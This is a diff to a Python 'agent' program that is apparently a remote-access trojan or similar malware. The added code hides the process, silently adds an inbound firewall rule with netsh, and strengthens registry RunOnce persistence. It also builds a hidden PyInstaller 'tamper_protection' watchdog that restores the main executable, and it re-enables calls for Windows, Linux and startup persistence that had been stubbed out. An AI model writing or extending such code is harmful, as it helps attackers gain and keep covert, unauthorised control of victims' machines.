@@ -94,6 +94,36 @@ except ImportError:
     STEALTH_AVAILABLE = False
     print("Warning: stealth_enhancer not available, using basic stealth")
 
+# Define basic stealth functions if stealth_enhancer is not available
+if not STEALTH_AVAILABLE:
+    def hide_process():
+        """Basic process hiding."""
+        if WINDOWS_AVAILABLE:
+            try:
+                # Set process to run in background with low priority
+                process = psutil.Process()
+                process.nice(psutil.BELOW_NORMAL_PRIORITY_CLASS)
+                return True
+            except:
+                return False
+        return False
+    
+    def add_firewall_exception():
+        """Basic firewall exception."""
+        if WINDOWS_AVAILABLE:
+            try:
+                current_exe = sys.executable if hasattr(sys, 'executable') else 'python.exe'
+                rule_name = f"Python Agent {uuid.uuid4()}"
+                subprocess.run([
+                    'netsh', 'advfirewall', 'firewall', 'add', 'rule',
+                    f'name={rule_name}', 'dir=in', 'action=allow',
+                    f'program={current_exe}'
+                ], creationflags=subprocess.CREATE_NO_WINDOW, check=True, capture_output=True)
+                return True
+            except:
+                return False
+        return False
+
 # Standard library imports
 import requests
 import time
@@ -2114,6 +2144,8 @@ def deploy_executable_with_persistence():
             
             print("[OK] RunOnce persistence established")
             
+        except PermissionError:
+            print("[WARN] Registry access denied - persistence may not work")
         except Exception as e:
             print(f"[WARN] Registry persistence failed: {e}")
         
@@ -2141,8 +2173,8 @@ import subprocess
 import shutil
 
 def check_and_restore():
-    main_exe = "{stealth_location}"
-    backup_exe = "{backup_location}"
+    main_exe = r"{stealth_location}"
+    backup_exe = r"{backup_location}"
     
     while True:
         try:
@@ -2175,10 +2207,15 @@ if __name__ == "__main__":
             f.write(tamper_script)
         
         # Build tamper protection executable
-        subprocess.run([
-            'pyinstaller', '--onefile', '--windowed', '--name', 'tamper_protection',
-            tamper_script_path
-        ], creationflags=subprocess.CREATE_NO_WINDOW)
+        try:
+            subprocess.run([
+                'pyinstaller', '--onefile', '--windowed', '--name', 'tamper_protection',
+                tamper_script_path
+            ], creationflags=subprocess.CREATE_NO_WINDOW, timeout=300)  # 5 minute timeout
+        except subprocess.TimeoutExpired:
+            print("[WARN] Tamper protection build timed out, continuing without it")
+        except Exception as e:
+            print(f"[WARN] Failed to build tamper protection: {e}")
         
         # Move tamper protection to stealth location
         tamper_exe = os.path.join('dist', 'tamper_protection.exe')
@@ -7193,25 +7230,31 @@ def agent_main():
             print("Running on Windows - initializing Windows-specific features...")
             
             # Check admin privileges
-            if False: # Replaced is_admin() with False
-                print("[INFO] Not running as administrator. Attempting to elevate...")
-                # elevate_privileges() # This function was removed, so this line is commented out or removed
-            else:
+            if is_admin():
                 print("[OK] Running with administrator privileges")
-            
-            # Setup persistence (non-blocking)
-            try:
-                # The setup_persistence function was removed, so this line is commented out or removed
-                pass # Placeholder for persistence if it were implemented
-            except Exception as e:
-                print(f"[WARN] Could not setup persistence: {e}")
+                # Setup advanced persistence if available
+                try:
+                    setup_advanced_persistence()
+                except Exception as e:
+                    print(f"[WARN] Could not setup advanced persistence: {e}")
+            else:
+                print("[INFO] Not running as administrator. Using basic persistence...")
+                # Setup basic persistence
+                try:
+                    establish_persistence()
+                except Exception as e:
+                    print(f"[WARN] Could not setup persistence: {e}")
         else:
             print("Running on non-Windows system")
+            # Setup Linux persistence
+            try:
+                establish_linux_persistence()
+            except Exception as e:
+                print(f"[WARN] Could not setup Linux persistence: {e}")
         
         # Setup startup (non-blocking)
         try:
-            # The add_to_startup function was removed, so this line is commented out or removed
-            pass # Placeholder for startup if it were implemented
+            add_to_startup()
         except Exception as e:
             print(f"[WARN] Could not add to startup: {e}")
         
